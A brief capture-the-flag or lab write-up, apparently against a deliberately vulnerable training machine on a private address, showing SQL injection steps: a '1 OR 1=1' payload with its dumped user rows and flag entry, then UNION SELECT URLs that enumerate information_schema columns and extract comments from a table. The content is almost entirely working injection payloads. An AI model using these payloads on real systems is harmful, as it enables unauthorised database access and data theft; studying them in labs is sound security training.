# SQL Injection

```
1 OR 1=1
```
```
ID: 1 OR 1=1 
First name: Barack Hussein
Surname : Obama

ID: 1 OR 1=1 
First name: Adolf
Surname : Hitler

ID: 1 OR 1=1 
First name: Joseph
Surname : Staline

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
```

list Columns : 
`http://192.168.56.102/\?page\=searchimg\&id\=1+UNION+ALL+SELECT+column_name%2Ctable_name+from+information_schema.columns\&Submit\=Submit\#`

display comment : 
`http://192.168.56.102/?page=searchimg&id=1+UNION+SELECT+concat%28id%2Cchar%2858%29%2Curl%2Cchar%2858%29%2Ctitle%2Cchar%2858%29%2Ccomment%2Cchar%2858%29%29%2C2+FROM+list_images&Submit=Submit#`

